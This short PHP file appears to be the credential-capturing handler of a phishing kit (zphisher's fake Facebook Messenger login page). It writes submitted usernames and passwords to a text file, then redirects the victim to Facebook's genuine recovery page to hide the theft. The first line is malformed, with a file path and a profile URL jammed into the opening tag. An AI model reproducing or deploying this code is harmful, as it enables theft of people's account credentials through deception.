<?php zphisher/.sitios/fb_messenger/ inicio de sesión.phphttps://www.facebook.com/sandynany.esparza


file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/recover/initiate/');
exit();
?>
